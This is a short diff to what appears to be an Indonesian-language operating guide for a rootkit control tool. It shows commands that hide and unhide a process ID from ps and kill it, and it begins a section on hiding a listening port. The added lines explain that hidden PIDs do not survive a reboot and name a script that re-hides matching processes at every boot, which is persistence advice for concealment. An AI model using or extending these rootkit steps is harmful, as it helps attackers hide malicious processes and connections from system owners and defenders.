@@ -41,6 +41,8 @@
    ps aux | grep -w $SP | grep -v grep           # KOSONG
    /rootkit/control/cli/rkit unhide pid $SP
    kill $SP
+   # catatan: hidepid TIDAK ikut reboot (PID berubah) — untuk re-hide otomatis
+   # tiap boot pakai tools/rkit-rehide.sh (pola proses -> pgrep -> hide)
 
 5. HIDE PORT (koneksi)
    python3 -m http.server 8080 &
